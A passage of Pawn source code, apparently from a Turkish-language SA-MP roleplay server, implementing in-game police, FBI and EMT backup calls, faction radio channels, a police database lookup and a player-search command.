	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
	    {
	        if(PDFDestek[playerid] == 0)
	        {
	            OnPlayerCommandPerformed(playerid, "/me yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
	            PDFDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[DEPARTMAN] FBI birimlerinin dikkatine; %s bölgesinde Memur %s için acil destek çaðrýsý.",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer2[playerid] = SetTimerEx("HareketliDestek2", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == FBI))
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
					}
	            }
	        }
	        else
	        {
	            PDFDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer2[playerid]);
				foreach(new i : Player)
				{
				    if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == FBI))
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
	        }
	    }
	    return 1;
	}
	//FBI->PD
	else if(strcmp(string, "/pdestekiste", true) == 0 || strcmp(string, "/pde", true) == 0 || strcmp(string, "/pdestek", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
	        if(FPDDestek[playerid] == 0)
	        {
	            FPDDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[DEPARTMAN] LSPD birimlerinin dikkatine; %s bölgesinde Ajan %s için acil destek çaðrýsý.",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer2[playerid] = SetTimerEx("HareketliDestek2", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == FBI))
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
					}
	            }
	        }
	        else
	        {
	            FPDDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer2[playerid]);
				foreach(new i : Player)
				{
				    if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == FBI))
				    {
				        RemovePlayerMapIcon(i, playerid);
				        Bilgi(playerid, "Destek çaðrýnýzý sonlandýrdýnýz.");
				    }
				}
	        }
	    }
	    return 1;
	}
	//PD->FD
	else if(strcmp(string, "/hdestekiste", true) == 0 || strcmp(string, "/hde", true) == 0 || strcmp(string, "/hdestek", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1)
	    {
	        if(PDHDestek[playerid] == 0)
	        {
	            OnPlayerCommandPerformed(playerid, "/me yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
	            PDHDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[DEPARTMAN] EMT birimlerinin dikkatine; %s bölgesinde Memur %s için acil destek çaðrýsý.",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer3[playerid] = SetTimerEx("HareketliDestek3", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == LSFD))
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
						PlayAudioStreamForPlayer(i, "https://www.eightbornrpg.com/ambulance.mp3");
					}
	            }
	        }
	        else
	        {
	            PDHDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer3[playerid]);
				foreach(new i : Player)
				{
				    if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == LSFD))
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
	        }
	    }
	    return 1;
	}
	//FD->PD
	else if(strcmp(string, "/pddestekiste", true) == 0 || strcmp(string, "/pdde", true) == 0 || strcmp(string, "/pddestek", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
	    {
	        if(HPDDestek[playerid] == 0)
	        {
	            HPDDestek[playerid] = 1;
	            new BolgeBulucu[MAX_ZONE_NAME];
				GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
	            format(string,sizeof(string),"[DEPARTMAN] LSPD birimlerinin dikkatine; %s bölgesinde %s için acil destek çaðrýsý.",BolgeBulucu,OyuncuAdiniBul(playerid));
	            new Float:DX, Float:DY, Float:DZ;
	            GetPlayerPos(playerid, DX, DY, DZ);
	            DestekTimer3[playerid] = SetTimerEx("HareketliDestek3", 1000, false, "i", playerid);
	            foreach(new i : Player)
	            {
	                if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == LSFD))
	                {
	                    RemovePlayerMapIcon(i, playerid);
	                    SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
						SendClientMessage(i, 0xFFF400FF, string);
					}
	            }
	        }
	        else
	        {
	            HPDDestek[playerid] = 0;
	            Bilgi(playerid, "Destek talebini iptal ettiniz.");
				KillTimer(DestekTimer3[playerid]);
                foreach(new i : Player)
				{
				    if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == LSFD))
				    {
				        RemovePlayerMapIcon(i, playerid);
				    }
				}
	        }
	    }
	    return 1;
	}
	else if(strcmp(string, "/veritabani", true) == 0 || strcmp(string, "/veritabaný", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new giveplayerid;
	        if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	        {
	            if(!IsPlayerInAnyVehicle(playerid) && GetPlayerInterior(playerid) == 0) return Hata(playerid, "Aracýn içinde deðilsiniz.");
				if(IsPlayerInAnyVehicle(playerid) && Arac[GetPlayerVehicleID(playerid)][abirliktip] != LSPD) return Hata(playerid, "Polis aracýnýn içinde deðilsiniz.");
				if(!IsPlayerInAnyVehicle(playerid) && GetPlayerInterior(playerid) != 0 && GetPlayerVirtualWorld(playerid) > 10) return Hata(playerid, "Polis departmanýnda deðilsiniz.");
	            string = strtok(cmdtext, idx);
	            if(!strlen(string))
	            {
	                Kullanim(playerid, "/veritabaný [fonksiyon]");
	                SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kisisorgula, plakasorgula, aracsorgula, telsorgula");
	                return 1;
				}
				if(strcmp(string, "kisisorgula", true) == 0)
				{
					string = strtok(cmdtext,idx);
					if(!strlen(string))
					{
						Kullanim(playerid, "/veritabaný kisisorgula [isim/oyuncuID]");
						return 1;
					}
					giveplayerid = ReturnUser(string);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
							SicilGoruntule(playerid,giveplayerid);
						}
					}
					else
					{
						Hata(playerid, " Böyle bir oyuncu yok.");
					}
					return 1;
				}
				if(strcmp(string, "telsorgula", true) == 0)
				{
					string = strtok(cmdtext,idx);
					if(!strlen(string))
					{
						Kullanim(playerid, "/veritabaný telsorgula [tel No]");
						return 1;
					}
					giveplayerid = strval(string);
					TelSorgula(playerid, giveplayerid);
					return 1;
				}
				if(strcmp(string, "aracsorgula", true) == 0)
				{
					string = strtok(cmdtext,idx);
					if(!strlen(string))
					{
						Kullanim(playerid, "/veritabaný aracsorgula [oyuncuID/isim]");
						return 1;
					}
					giveplayerid = ReturnUser(string);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					    	new asdas[128];
					        format(asdas, sizeof(asdas), "{FFFFFF}---------------------- %s ----------------------", OyuncuAdiniBul(giveplayerid));
					        SendClientMessage(playerid,COLOR_WHITE,asdas);
							for(new q;q<MAX_VEHICLES;q++)
							{
				                new modil = Arac[q][amodel];
								if(Arac[q][aowner] == Karakter[giveplayerid][sqlid])
								{
									if(Arac[q][atip] == 5) format(asdas, sizeof(asdas), "[KÝRALIK] Araç modeli: %s - Sahip: %s - Plaka: %s",VehicleName[modil-400][0], OyuncuAdiniBul(giveplayerid), Arac[q][aplaka]);
									else format(asdas, sizeof(asdas), "Araç modeli: %s - Sahip: %s - Plaka: %s",VehicleName[modil-400][0], OyuncuAdiniBul(giveplayerid), Arac[q][aplaka]);
									SendClientMessage(playerid,-1,asdas);
								}
							}
						}
					}
					else
					{
						Hata(playerid, " Böyle bir oyuncu yok.");
					}
					return 1;
				}
				if(strcmp(string, "plakasorgula", true) == 0)
				{
					new lengthplk = strlen(cmdtext);
					while ((idx < lengthplk) && (cmdtext[idx] <= ' '))
					{
					idx++;
					}
					new offsetplk = idx;
					new resultplk[128];
					while ((idx < lengthplk) && ((idx - offsetplk) < (sizeof(resultplk) - 1)))
					{
					resultplk[idx - offsetplk] = cmdtext[idx];
					idx++;
					}
					resultplk[idx - offsetplk] = EOS;
					if(!strlen(resultplk))
					{
					    Kullanim(playerid, "/veritabaný plakasorgula [plaka]");
					    return 1;
					}
					new yarraminbasi = 0;
					for(new vhcid;vhcid<MAX_VEHICLES;vhcid++)
					{
					    if(!strcmp(Arac[vhcid][aplaka],resultplk,true))
					    {
					        new asdas[128];
					        new modil = Arac[vhcid][amodel];
					        format(asdas, sizeof(asdas), "{FFFFFF}---------------------- %s ----------------------", SQLFromName(Arac[vhcid][aowner]));
					        SendClientMessage(playerid,-1,asdas);
							format(asdas, sizeof(asdas), "Araç modeli: %s - Sahip: %s - Plaka: %s",VehicleName[modil-400][0], SQLFromName(Arac[vhcid][aowner]), Arac[vhcid][aplaka]);
							SendClientMessage(playerid,-1,asdas);
							yarraminbasi++;
							break;
						}
					}
					if(yarraminbasi == 0) return Hata(playerid, "Sonuç bulunamadý.");
				}
			}
			else
			{
			    Hata(playerid, "Polis deðilsiniz veya iþbaþýnda deðilsiniz.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/ftelsiz", true) == 0 || strcmp(string, "/ft", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthts = strlen(cmdtext);
			while ((idx < lengthts) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetts = idx;
			new resultts[128];
			while ((idx < lengthts) && ((idx - offsetts) < (sizeof(resultts) - 1)))
			{
				resultts[idx - offsetts] = cmdtext[idx];
				idx++;
			}
			resultts[idx - offsetts] = EOS;
			if(!strlen(resultts))
			{
				Kullanim(playerid, "(/ft)elsiz [telsiz konuþmasý]");
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
			{
			    format(string,sizeof(string),"[TELSIZ] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/me yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Birlik[Karakter[i][birlik]][ftip] == FBI)
					{
					    MesajGonder(i,0x8D8DFFFF,string);
						PlayCrimeReportForPlayer(i,playerid,random(18)+3);
					}
				}
				return 1;
			}
			else
			{
			    Hata(playerid, "Telsiziniz yok.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/telsiz", true) == 0 || strcmp(string, "/t", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthts = strlen(cmdtext);
			while ((idx < lengthts) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetts = idx;
			new resultts[128];
   			new _toxt[3][128];
			while ((idx < lengthts) && ((idx - offsetts) < (sizeof(resultts) - 1)))
			{
				resultts[idx - offsetts] = cmdtext[idx];
				idx++;
			}
			resultts[idx - offsetts] = EOS;
			if(!strlen(resultts))
			{
				Kullanim(playerid, "(/t)elsiz [telsiz konuþmasý]");
				return 1;
			}
			if(Karakter[playerid][isbasi] && Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
			{
			    format(string,sizeof(string),"[CH: 911, S:1] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/ame elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][isbasi] && Birlik[Karakter[i][birlik]][ftip] == LSPD)
					{
					    MesajGonder(i,0x8D8DFFFF,string);
						PlayCrimeReportForPlayer(i,playerid,random(18)+3);
					}
				}
				if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
				return 1;
			}
			else if(Karakter[playerid][isbasi] && Birlik[Karakter[playerid][birlik]][ftip] == FBI)
			{
			    format(string,sizeof(string),"[CH: 911, S:2] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/ame elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][isbasi] && Birlik[Karakter[i][birlik]][ftip] == FBI)
					{
					    MesajGonder(i,0x8D8DFFFF,string);
						PlayCrimeReportForPlayer(i,playerid,random(18)+3);
					}
				}
				if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
				return 1;
			}
			else if(Karakter[playerid][medisbasi])
			{
			    format(string,sizeof(string),"[CH: 911, S:3] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/ame yakasýndaki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][medisbasi] && Karakter[i][birlik] == Karakter[playerid][birlik])
					{
					    MesajGonder(i,0xFF9393FF,string);
						PlayCrimeReportForPlayer(i,playerid,random(18)+3);
					}
				}
				if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
				return 1;
			}
			else if(Karakter[playerid][sisbasi])
			{
			    format(string,sizeof(string),"[TELSIZ] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/ame elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][sisbasi] && Karakter[i][birlik] == Karakter[playerid][birlik])
					{
					    MesajGonder(i,COLOR_SANTV,string);
					}
				}
				if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
				return 1;
			}
			else if(Karakter[playerid][fdisbasi])
			{
			    format(string,sizeof(string),"[TELSIZ] %s: %s",OyuncuAdiniBul(playerid),resultts);
			    OnPlayerCommandPerformed(playerid,"/ame elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(Karakter[i][fdisbasi] && Karakter[i][birlik] == Karakter[playerid][birlik])
					{
					    MesajGonder(i,COLOR_SANTV,string);
					}
				}
				if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
				return 1;
			}
			else
			{
			    if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telsiz kullanamazsýnýz.");
			    if(!Karakter[playerid][telsiz]) return Hata(playerid, "Telsiziniz yok.");
			    OnPlayerCommandPerformed(playerid,"/ame elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
			    format(string,sizeof(string),"{7ec0ee}[TELSIZ] %s: %s",OyuncuAdiniBul(playerid),resultts);
				new Float:xp, Float:yp, Float:zp;
				GetPlayerPos(playerid, xp, yp, zp);
			    foreach(new i : Player)
			    {
					if(Karakter[i][telsiz] == 1 && Karakter[playerid][frekans] == Karakter[i][frekans])
					{
					    if(IsPlayerInRangeOfPoint(i,1000,xp,yp,zp))
						{
					    	MesajGonder(i,-1,string);
						}
					}
			    }
                if(strlen(resultts) > 80)
				{
					TextBol(resultts,_toxt,60);
					format(string, sizeof(string), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), _toxt[0]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					format(string, sizeof(string), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), _toxt[1]);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			   	}
				else
				{
					format(string, sizeof(string), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultts);
					ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
					new to_others[MAX_CHATBUBBLE_LENGTH+1];
					format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultts);
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/operator", true) == 0 || strcmp(string, "/o", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthd = strlen(cmdtext);
			while ((idx < lengthd) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetd = idx;
			new resultd[128];
			while ((idx < lengthd) && ((idx - offsetd) < (sizeof(resultd) - 1)))
			{
				resultd[idx - offsetd] = cmdtext[idx];
				idx++;
			}
			resultd[idx - offsetd] = EOS;
			if(!strlen(resultd))
			{
				Kullanim(playerid, "(/o)perator [departman konuþmasý]");
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] <= 16)
			{
			    //if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 11) return Hata(playerid, "Bu komutunu kullanmak için yetkiniz yeterli deðil.");
			    format(string,sizeof(string),"[OPERATOR] %s: %s",OyuncuAdiniBul(playerid),resultd);
				for(new i=0;i<MAX_PLAYERS;i++){
				if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
				MesajGonder(i,0xAAAAFFFF,string);
				}
				}
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == ASMS && Karakter[playerid][rutbe] <= 13)
			{
			    //if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 11) return Hata(playerid, "Bu komutunu kullanmak için yetkiniz yeterli deðil.");
			    format(string,sizeof(string),"[OPERATOR] %s: %s",OyuncuAdiniBul(playerid),resultd);
				for(new i=0;i<MAX_PLAYERS;i++){
				if(Birlik[Karakter[i][birlik]][ftip] == ASMS && Girdi[i]){
				MesajGonder(i,0xAAAAFFFF,string);
				}
				}
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD && Karakter[playerid][rutbe] <= 16)
			{
			    //if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 11) return Hata(playerid, "Bu komutunu kullanmak için yetkiniz yeterli deðil.");
			    format(string,sizeof(string),"[OPERATOR] %s: %s",OyuncuAdiniBul(playerid),resultd);
				for(new i=0;i<MAX_PLAYERS;i++){
				if(Birlik[Karakter[i][birlik]][ftip] == LSFD && Girdi[i]){
				MesajGonder(i,0xAAAAFFFF,string);
				}
				}
				return 1;
			}
			else
			{
				Hata(playerid, "Operatör yetkiniz bulunmuyor.");
				return 1;
   			}

		}
		return 1;
	}
	if(strcmp(string, "/departman", true) == 0 || strcmp(string, "/d", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new lengthd = strlen(cmdtext);
			while ((idx < lengthd) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offsetd = idx;
			new resultd[128];
			while ((idx < lengthd) && ((idx - offsetd) < (sizeof(resultd) - 1)))
			{
				resultd[idx - offsetd] = cmdtext[idx];
				idx++;
			}
			resultd[idx - offsetd] = EOS;
			if(!strlen(resultd))
			{
				Kullanim(playerid, "(/d)epartman [departman konuþmasý]");
				return 1;
			}
			if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
			{
			    format(string,sizeof(string),"[DEPARTMAN] %s: %s",OyuncuAdiniBul(playerid),resultd);
			    OnPlayerCommandPerformed(playerid,"/me elindeki telsizin mandalýna basar ve konuþmaya baþlar.",0);
				for(new i=0;i<MAX_PLAYERS;i++) {
					if(Birlik[Karakter[i][birlik]][ftip] == LSPA || Birlik[Karakter[i][birlik]][ftip] == LSPD || Birlik[Karakter[i][birlik]][ftip] == FBI || Birlik[Karakter[i][birlik]][ftip] == ASMS || Birlik[Karakter[i][birlik]][ftip] == LSFD) {
						MesajGonder(i,0xAAAAFFFF,string);
					}
				}
			}
			else
			{
				Hata(playerid, "LSPD, LSPA, FBI, LSFD veya ASMS görevlisi deðilsiniz.");
				return 1;
			}
			new mstring[128];
			if(strlen(resultd) > 80)
			{
		 		new toxt1[3][128];
				TextBol(resultd,toxt1,60);
				format(mstring, sizeof(mstring), "%s (telsiz): %s ...",OyuncuAdiniBul(playerid), toxt1[0]);
				ProxDetector(20.0, playerid, mstring,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				format(mstring, sizeof(mstring), "%s (telsiz): ... %s",OyuncuAdiniBul(playerid), toxt1[1]);
				ProxDetector(20.0, playerid, mstring,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				KonusturMeyhaneci(playerid, strlen(resultts));
			}
			else
			{
				format(mstring, sizeof(mstring), "%s (telsiz): %s",OyuncuAdiniBul(playerid), resultd);
				ProxDetector(20.0, playerid, mstring,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
				new to_others[MAX_CHATBUBBLE_LENGTH+1];
				format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",resultd);
				KonusturMeyhaneci(playerid, strlen(resultd));
			}
		}
		return 1;
	}
	if(strcmp(string,"/uara",true)==0 || strcmp(string, "/ustunuara", true)== 0 || strcmp(string, "/uzeriniara", true) == 0 || strcmp(string, "/ustara", true) == 0)
    {
        if(IsPlayerConnected(playerid))
		{
	        string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/ustara [ID/isim]");
				return 1;
			}
			new	giveplayerid = ReturnUser(string);
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
				    if (ProxDetectorS(3.0, playerid, giveplayerid))
					{
					    if(!Kelepceli[giveplayerid])
					    {
							new str2[128];
							format(string,sizeof(string),""C7"EIGHTBORN - "C8"/uara");
							format(str2,sizeof(str2),"{FFFFFF}%s adlý kiþi üstünüzü aramaya çalýþýyor.",OyuncuAdiniBul(playerid));
							ShowPlayerDialog(giveplayerid,162,DIALOG_STYLE_MSGBOX,string,str2,"Onayla","Kapat");
							format(string,sizeof(string),"/me %s adlý kiþinin üstünü aramaya çalýþýr.",OyuncuAdiniBul(giveplayerid));
							OnPlayerCommandPerformed(playerid,string,0);
							UstunuAra[giveplayerid] = playerid;
						}
						else
						{
						    format(string, sizeof(string), "{47B312}%s isimli oyuncunun üzerini arýyorsunuz:", OyuncuAdiniBul(giveplayerid));
						    SendClientMessage(playerid, -1, string);
						    format(string, sizeof(string), "Nakit: %d$", GetPlayerCash(giveplayerid));
						    SendClientMessage(playerid, COLOR_WHITE, string);
						    if(Karakter[giveplayerid][telno] != 0)
						    {
						        SendClientMessage(playerid, COLOR_WHITE, "Cep telefonu var.");
							}
							if(Karakter[giveplayerid][maske] == 1)
							{
								SendClientMessage(playerid, COLOR_WHITE, "Maske var.");
							}
							if(Karakter[giveplayerid][telsiz] != 0)
							{
								SendClientMessage(playerid, COLOR_WHITE, "Telsiz var.");
							}
